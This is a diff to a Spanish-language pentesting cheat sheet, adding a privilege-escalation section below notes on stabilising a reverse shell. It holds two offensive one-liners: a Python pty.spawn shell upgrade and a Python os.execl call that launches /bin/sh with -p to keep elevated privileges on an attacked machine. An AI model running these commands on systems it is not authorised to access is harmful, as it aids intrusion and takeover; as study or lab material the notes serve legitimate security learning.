@@ -314,3 +314,9 @@ Cuando ingresamos a la consola en reverse, si esta no tiene python, usaremos el 
 Si la consola Si tiene Python, usaremos el siguiente comando: 
 
 **python3 -c 'import pty;pty.spawn("/bin/bash")**
+
+***Escala de privilegios***:
+
+Si la consola a la que estas atacando tiene signos de tener python instalado, puedes usar el siguiente comando para escalar los privilegios. 
+
+**python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**
